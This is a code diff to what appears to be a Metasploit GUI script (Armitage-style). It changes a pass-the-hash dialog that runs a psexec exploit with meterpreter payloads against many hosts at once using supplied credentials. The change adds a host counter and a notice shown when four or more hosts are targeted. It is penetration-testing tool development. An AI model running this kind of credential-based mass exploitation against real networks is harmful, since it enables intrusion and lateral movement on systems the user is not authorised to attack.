@@ -283,7 +283,7 @@ sub pass_the_hash {
 	[$bottom add: left($reverse)];
 
 	[$button addActionListener: lambda({
-		local('$u $p %options $host $e');
+		local('$u $p %options $host $e $total');
 		($e) = @_;
 
 		%options["SMBDomain"] = [$domain getText];
@@ -304,6 +304,7 @@ sub pass_the_hash {
 			%options["SMBUser"] = [$user getText];
 			%options["SMBPass"] = [$pass getText];
 			%options["LPORT"] = randomPort();
+			$total = size($hosts);
 
 			foreach $host ($hosts) {
 				if ([$reverse isSelected]) {
@@ -318,9 +319,14 @@ sub pass_the_hash {
 					%options["PAYLOAD"] = "windows/meterpreter/bind_tcp";
 				}
 				%options["RHOST"] = $host;
-				module_execute("exploit", $module, copy(%options));
+				module_execute("exploit", $module, copy(%options), $total);
 			}
+
 			elog("psexec: " . [$user getText] . ":" . [$pass getText] . " @ " . join(", ", $hosts));
+
+			if ($total >= 4) {
+				showError("Launched $module at $total hosts");
+			}
 		}
 
 		if (!isShift($e)) {
